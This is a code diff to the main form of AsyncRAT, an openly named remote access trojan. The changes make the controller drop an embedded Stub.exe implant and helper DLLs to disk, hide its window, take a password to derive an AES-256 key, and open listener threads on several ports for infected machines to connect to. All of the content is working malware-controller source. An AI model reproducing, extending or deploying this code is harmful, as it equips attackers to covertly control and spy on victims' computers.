@@ -9,6 +9,8 @@ using System.Threading;
 using System.Drawing;
 using System.IO;
 using AsyncRAT_Sharp.Forms;
+using AsyncRAT_Sharp.Cryptography;
+using System.Diagnostics;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -25,21 +27,65 @@ namespace AsyncRAT_Sharp
         private static Builder builder = new Builder();
         public Form1()
         {
+            CheckFiles();
             InitializeComponent();
+            this.Opacity = 0;
         }
 
+        private Listener listener;
+
+        private void CheckFiles()
+        {
+            try
+            {
+                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
+                {
+                    File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
+                    Process.Start(Application.ExecutablePath);
+                    Environment.Exit(0);
+                }
+
+                if (!File.Exists(Path.Combine(Application.StartupPath, "cGeoIp.dll")))
+                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "cGeoIp.dll"), Properties.Resources.cGeoIp);
+
+                if (!File.Exists(Path.Combine(Application.StartupPath, "dnlib.dll")))
+                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "dnlib.dll"), Properties.Resources.dnlib);
+
+                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
+                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));
+
+                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
+                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "Stub\\Stub.exe"), Properties.Resources.Stub);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            var input = Interaction.InputBox("", "Select Port", "6606",-1,-1);
-            if (string.IsNullOrWhiteSpace(input)) Environment.Exit(0);
-            Settings.Port = Convert.ToInt32(input);
-
             Text = $"{Settings.Version} // NYAN CAT";
-            Listener listener = new Listener();
 
-            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
-            thread.Start(Settings.Port);
+            PortsFrm portsFrm = new PortsFrm();
+            portsFrm.ShowDialog();
+
+            Methods.FadeIn(this, 5);
+            Settings.Port = portsFrm.textPorts.Text;
+            Settings.Password = portsFrm.textPassword.Text;
+            Settings.aes256 = new Aes256(Settings.Password);
+
+            string[] P = Settings.Port.Split(',');
+            foreach (var PORT in P)
+            {
+                if (!string.IsNullOrWhiteSpace(PORT))
+                {
+                    Settings.Ports.Add(Convert.ToInt32(PORT.ToString().Trim()));
+                    listener = new Listener();
+                    Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
+                    thread.Start(Convert.ToInt32(PORT.ToString().Trim()));
+                }
+            }
         }
 
 
